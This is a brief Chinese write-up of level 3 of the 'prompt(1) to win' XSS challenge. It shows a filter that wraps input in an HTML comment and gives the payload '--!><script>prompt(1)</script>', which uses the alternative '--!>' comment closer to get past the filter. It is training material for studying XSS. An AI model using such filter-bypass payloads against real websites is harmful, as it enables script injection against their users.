## [[prompt(1) to win](http://prompt.ml)] [[Level 3 - HTML Comment](http://prompt.ml/3)] [[解题报告](http://exp-blog.com/2019/03/18/pid-3631/)]

------

## 题目

```javascript
function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}
```

------

## 解题报告

正则把 `->` 过略了，导致我们无法闭合注释。

但是 HTML 注释还有另一种闭合方式：`<!--  xxxxx  --!>`

因此构造这样的 payload 即可实现绕过：`--!><script>prompt(1)</script>`

![](http://exp-blog.com/wp-content/uploads/2019/03/8c6abaa3793d56b7ba03c8e602401451.png)

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
